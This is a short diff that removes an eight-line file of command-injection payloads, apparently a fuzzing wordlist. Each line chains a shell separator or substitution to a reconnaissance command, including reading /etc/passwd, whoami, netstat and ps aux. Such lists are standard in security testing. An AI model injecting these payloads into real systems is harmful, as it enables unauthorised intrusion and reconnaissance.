@@ -1,8 +1,0 @@
-; cat /etc/passwd
-| whoami
-&& uname -a
-`id`
-$(whoami)
-; ls -la /
-| netstat -tulpn
-&& ps aux
